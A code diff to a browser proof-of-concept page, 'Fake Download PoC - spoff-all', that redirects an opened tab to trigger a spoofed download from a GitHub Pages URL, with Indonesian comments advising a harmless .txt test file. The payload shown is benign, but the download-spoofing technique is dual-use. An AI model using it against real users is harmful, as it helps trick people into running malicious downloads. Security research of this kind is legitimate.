@@ -48,10 +48,17 @@ function triggerDirectDownload() {
 }
 
 function next() {
-  document.getElementById('status').innerText = 'Triggering spoofed download...';
+  // Ganti dengan file test kamu (pakai .txt dulu untuk safety)
+  // Default: https://zzz0029.github.io/spoff-all/fake-download/test.txt
+  const targetUrl = window.location.protocol.startsWith('http') 
+    ? new URL('test.txt', window.location.href).href 
+    : 'https://zzz0029.github.io/spoff-all/fake-download/test.txt';
+
+  document.getElementById('status').innerText = 'Triggering spoofed download: ' + targetUrl;
+
   try {
     if (w && !w.closed) {
-      w.location.href = 'test.txt';
+      w.location.replace(targetUrl);
     } else {
       triggerDirectDownload();
     }
@@ -84,7 +91,7 @@ function f() {
 </script>
 </head>
 <body>
-  <h2>Fake Download PoC</h2>
+  <h2>Fake Download PoC - spoff-all</h2>
   <button class="btn" onclick="f()">Test PoC (Spoofed Tab)</button>
   <button class="btn btn-secondary" onclick="triggerDirectDownload()">Download test.txt Directly</button>
   <p id="status"></p>
